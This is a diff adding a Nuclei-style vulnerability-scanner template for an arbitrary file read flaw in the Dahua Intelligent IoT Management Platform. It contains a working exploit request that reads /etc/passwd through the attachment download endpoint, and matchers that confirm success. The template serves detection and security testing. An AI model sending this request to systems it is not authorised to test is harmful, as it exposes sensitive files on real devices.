@@ -1,0 +1,30 @@
+id: dahua-intelligent-iot-anyfile-read
+
+info:
+  name: Dahua Intelligent IoT Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    The Dahua Intelligent IoT Management Platform is vulnerable to arbitrary file read attacks. Exploitation of this vulnerability can lead to unauthorized access to sensitive files such as /etc/passwd.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin/bash"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
